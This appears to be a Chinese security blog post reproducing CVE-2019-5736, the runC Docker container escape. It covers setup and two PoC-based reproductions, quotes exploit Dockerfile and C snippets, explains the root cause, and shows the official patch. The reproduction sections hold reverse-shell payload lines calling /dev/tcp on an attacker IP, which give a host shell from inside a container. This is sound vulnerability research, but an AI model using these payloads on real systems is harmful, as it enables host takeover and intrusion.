+<p>Docker 利用 Linux 核心中的资源分脱机制，例如 cgroups， Linux 核心名字空间（name space），以及AUFS类的UnionFS等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。Docker 在容器的基础上进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护，使得其比虚拟机技术更为轻便、快捷。Docker 可以在单一 Linux 实体下运作，避免因为创建一个虚拟机而造成的额外负担。传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p>
+<p>Docker 和传统虚拟机对比，具有更快的启动速度、更高效的资源利用率、更高的系统支持量、持续交付与部署、更轻松的迁移、更轻松的维护与扩展等优点。</p>
+<p>Docker Hub是Docker提供的一项服务，用于寻找和共享容器镜像。它是世界上最大的容器映像库，其内容来源包括容器社区开发者、开源项目和独立软件供应商（ISV）在容器中构建和发布他们的代码。它是一个在线存储库，Docker 镜像可以由其他用户发布和使用。</p>
+<h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><p><strong>dockr images</strong>           列出本地镜像</p>
+<p><strong>docker ps</strong>             查看当前运行的容器</p>
+<p><strong>docker ps -a</strong>            查看全部容器</p>
+<p><strong>docker pull  NAME[:TAG]</strong>     从镜像仓库中拉取或者更新指定镜像</p>
+<p><strong>docker restart  container_id</strong>     重启容器</p>
+<p><strong>docker build -f Dockerfile_PATH</strong>   docker build 命令用于使用 Dockerfile 创建镜像。</p>
+<p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p>
+<p><strong>OPTIONS 说明:</strong></p>
+<p><strong>-d:</strong> 后台运行容器，并返回容器ID</p>
+<p><strong>-p:</strong> 指定端口映射，格式为：主机(宿主)端口:容器端口</p>
+<p><strong>–name</strong> “名称 “ : 为容器指定一个名称；</p>
+<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><hr>
+<p>Go语言（也称为Golang）是google在2009年推出的一种编译型编程语言。 相对于大多数语言，golang具有编写并发或网络交互简单、丰富的数据类型、编译快等特点，比较适合于高性能、高并发场景。 … golang正是由一个强大团队利用这20%时间开发的。</p>
+<h4 id="Golang-常用命令"><a href="#Golang-常用命令" class="headerlink" title="Golang 常用命令"></a>Golang 常用命令</h4><p>build: 编译包和依赖。</p>
+<p>run: 编译并运行go程序。</p>
+<p>clean: 移除当前源码包里面编译生成的文件。</p>
+<p>fmt: 运行gofmt进行格式化。</p>
+<p>get: 下载并安装包和依赖。</p>
+<p>install: 编译并安装包和依赖。</p>
+<p>list: 列出包。</p>
+<p>version: 显示当前环境安装go的版本</p>
+<h4 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h4><ul>
+<li><strong>多平台 ( <code>交叉编译</code> )</strong></li>
+</ul>
+<p><strong>一、Mac 下编译 Linux 和 Windows 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=linux </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><strong>二、Linux 下编译 Mac 和 Windows 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=darwin </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><strong>三、Windows 下编译 Mac 和 Linux 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><code>GOOS</code>：目标平台的操作系统（darwin、freebsd、linux、windows） GOARCH：目标平台的体系架构（386、amd64、arm） 交叉编译不支持 CGO 所以要禁用它</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装Ubuntu-16-04"><a href="#安装Ubuntu-16-04" class="headerlink" title="安装Ubuntu 16.04"></a>安装Ubuntu 16.04</h3><hr>
+<p>首先从官网下载镜像 ,</p>
+<p>下载地址: <a href="https://releases.ubuntu.com/16.04/">https://releases.ubuntu.com/16.04/</a></p>
+<p>使用 Vmware Workstation 虚拟机进行安装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916928.png" alt="image-20211201133831599"></p>
+<p>安装完毕, 会自动安装 Vmware-tools</p>
+<p>如若没有 , 可以手动进行安装 , 详情参考 <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">vmware 官方文档</a></p>
+<p>[+] <strong>官方文档 :</strong>  <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html</a></p>
+<ul>
+<li>  <strong>Ubuntu、Debian 及相关操作系统</strong></li>
+</ul>
+<ol>
+<li><p>请确保已更新软件包索引：</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></li>
+<li><p>如果虚拟机具有 GUI（X11 等），请安装或升级<br> open-vm-tools-desktop：</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure></li>
+<li><p>否则，请使用以下命令安装<br> open-vm-tools：</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="安装Docker-环境"><a href="#安装Docker-环境" class="headerlink" title="安装Docker 环境"></a>安装Docker 环境</h3><hr>
+<blockquote>
+<p>  <strong>Linux 环境</strong>:  Ubuntu 16.04</p>
+</blockquote>
+<blockquote>
+<p>  <strong>docker 版本</strong></p>
+<ul>
+<li>  docker version &lt;=18.09.2</li>
+<li>  RunC version &lt;=1.0-rc6</li>
+</ul>
+</blockquote>
+<h4 id="脚本搭建过程"><a href="#脚本搭建过程" class="headerlink" title="脚本搭建过程"></a><strong>脚本搭建过程</strong></h4><blockquote>
+<p>  (支持<strong>Ubuntu</strong> 和 <strong>CentOS</strong>) </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="手工搭建过程"><a href="#手工搭建过程" class="headerlink" title="手工搭建过程"></a><strong>手工搭建过程</strong></h4><p>Ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; \</span><br><span class="line">sudo VERSION=18.06.0 sh get-docker.sh</span><br></pre></td></tr></table></figure>
+
+<p>1、更新索引包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>2、安装以下包，以使 apt 可以通过 https 使用 repository</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
+
+<p>3、添加Docker官方的GPG密钥并更新索引包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -` `</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>  安装指定的docker版本</li>
+</ul>
+<p>1、列出可用版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917408.png" alt="image-20211206140408904"></p>
+<p>2、选择一个版本来安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce=&lt;VERSION&gt;</span><br><span class="line">比如： $ sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>3、查看是否安装正常</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start docker` `$ docker info</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="配置GoLang环境"><a href="#配置GoLang环境" class="headerlink" title="配置GoLang环境"></a>配置GoLang环境</h3><hr>
+<h4 id="安装Golang"><a href="#安装Golang" class="headerlink" title="安装Golang"></a>安装Golang</h4><p>apt安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br></pre></td></tr></table></figure>
+
+<p>官网 源码 编译安装</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先拉取 一个容器 例如 ==Ubuntu 16.04== </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916939.png" alt="image-20211022222251029"></p>
+<p>启动容器</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker run -d -it b6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917870.png" alt="image-20211022222830729"></p>
+<p>这里通过 exec 命令模拟 黑客 获取到容器的root权限的shell</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it 35 bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917219.png" alt="image-20211022223004305"></p>
+<h3 id="复现方式一"><a href="#复现方式一" class="headerlink" title="复现方式一"></a>复现方式一</h3><p>使用poc进行攻击，github 项目地址:</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p>循环等待 runC init的 PID -&gt; open(“/proc/pid/exe”，O_RDONLY) -&gt; execve()释放 runC的IO并覆盖runC二进制文件 -&gt; execve()执行被覆盖 runC</p>
+<p>修改payload</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n /bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917901.png" alt="image-20211206150536431"></p>
+<p>修改poc , bash 也可getshell</p>
+<p>修改payload, 编译poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p>上传 , 执行poc文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917173.png" alt="image-20211022223803309"></p>
+<p>此时, 如果用户从宿主机通过exec命令进入容器内容 , 就能成功触发poc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917438.png" alt="image-20211022224107696"></p>
+<p>攻击机成功收到 反弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917091.png" alt="image-20211022224359412"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看 ip , 确定shell 来自宿主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918481.png" alt="image-20211022224302900"></p>
+<h3 id="复现方式二"><a href="#复现方式二" class="headerlink" title="复现方式二"></a>复现方式二</h3><p>构造有漏洞的容器镜像, 完成漏洞复现</p>
+<p>GitHub 地址: <strong><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></strong></p>
+<p>思路: 研究人员通过欺骗runC init execve -&gt; runc 执行/proc/self/exe -&gt; /proc/[runc-pid]/exe覆盖runC 二进制文件</p>
+<blockquote>
+<p>  Dockerfile文件</p>
+</blockquote>
+<p>1.获取libseccomp文件并将run_at_link文件加入，runC启动运行libseccomp。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD run_at_link.c /root/run_at_link.c</span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root/libseccomp-* ;\</span><br><span class="line">    cat /root/run_at_link.c &gt;&gt; src/api.c ;\</span><br><span class="line">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span><br><span class="line">    dpkg -i /root/*.deb</span><br></pre></td></tr></table></figure>
+
+<p>2.overwrite_runc添加docker中并编译 3.使入口点指向runc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN set -e -x ;\</span><br><span class="line">    ln -s /proc/self/exe /entrypoint</span><br><span class="line">ENTRYPOINT [ &quot;/entrypoint&quot; ]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  run_at_link文件</p>
+</blockquote>
+<p>1.run_at_link read runc binary 获得fd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int runc_fd_read = open(&quot;/proc/self/exe&quot;, O_RDONLY);</span><br><span class="line">    if (runc_fd_read == -1 ) &#123;</span><br><span class="line">        printf(&quot;[!] can&#x27;t open /proc/self/exe\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Opened runC for reading as /proc/self/fd/%d\n&quot;, runc_fd_read);</span><br><span class="line">    fflush(stdout);</span><br></pre></td></tr></table></figure>
+
+<p>2.调用execve执行overwrite_runc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/overwrite_runc&quot;, argv_overwrite, NULL); </span><br></pre></td></tr></table></figure>
+
+<p>3.overwrite_runc写入poc string</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd RunC-CVE-2019-5736</span><br><span class="line">$ docker build -t cve-2019-5736:malicious_image_POC ./malicious_image_POC</span><br><span class="line">$ docker run --rm cve-2019-5736:malicious_image_POC</span><br></pre></td></tr></table></figure>
+
+<p>修改 new_runc , 修改接收反弹shell 的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918319.png" alt="image-20211202101831715"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918255.png" alt="image-20211202101719829"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918493.png" alt="image-20211202101522575"></p>
+<p>接收反弹shell </p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918457.png" alt="image-20211202101656476"></p>
+<p>查看ip , 确认为 宿主机 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919450.png" alt="image-20211202101715579"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918264.png" alt="image-20211202101936883"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p>
+<p>先来看<code>/proc/self/exe</code>是什么？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file /proc/self/exe</span><br><span class="line">/proc/self/exe: symbolic link to /usr/bin/file</span><br></pre></td></tr></table></figure>
+
+<p>proc/self/exe符号链接会指向调用者自身，同理proc/pid/exe会指向pid进程的调用者。但是/proc/pid/exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开/proc/pid/exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p>
+<p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过/proc/self/exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行/proc/self/exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p>
+<p>具体的利用步骤：</p>
+<ol>
+<li> 容器内生成一个恶意文件，将文件的调用者改为proc/self/exe</li>
+<li> 宿主机docker exec调用该恶意文件，会调用proc/self/exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li>
+<li> 得到容器进称号PID后，可以获取/proc/pid/exe文件描述符fd</li>
+<li> 对fd进行写操作，覆盖原有runc的文件</li>
+</ol>
+<p><strong>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</strong></p>
+<p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取/proc/PID/exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p>
+<p><strong>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</strong></p>
+<p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p>
+<h3 id="seebug"><a href="#seebug" class="headerlink" title="seebug"></a>seebug</h3><p><strong>runC利用链分析</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" alt="image-20211208090108977"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新至 最新版本</p>
+<p>官方修复方式</p>
+<p>链接: <a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919593.png" alt="image-20211208093157249"></p>
+<p>增加了一个<code>ensure_cloned_binary</code>函数</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> execfd;</span><br><span class="line">    char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line">    <span class="keyword">int</span> cloned = is_self_cloned();</span><br><span class="line">    <span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line">        <span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    execfd = clone_binary();</span><br><span class="line">    <span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">    fexecve(execfd, argv, envp);</span><br><span class="line">    <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static <span class="keyword">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">    is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ret = fstat(fd, &amp;statbuf);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">        is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断<code>/proc/self/exe</code>是否被clone，如果没有的话，则执行<code>clone_binary</code>函数，返回一个新的file handler。</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">static <span class="keyword">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> binfd, memfd;</span><br><span class="line">    ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">    binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">    sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line">    <span class="built_in">close</span>(binfd);</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    <span class="keyword">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line">    <span class="keyword">int</span> newfd;</span><br><span class="line">    char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line">    newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    free(fdpath);</span><br><span class="line">    <span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    <span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p>
+<p><a href="https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html">https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html</a></p>
+<p><a href="https://saucer-man.com/information_security/547.html">https://saucer-man.com/information_security/547.html</a></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><ul>
+<li>  <a href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></li>
+<li>  <a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
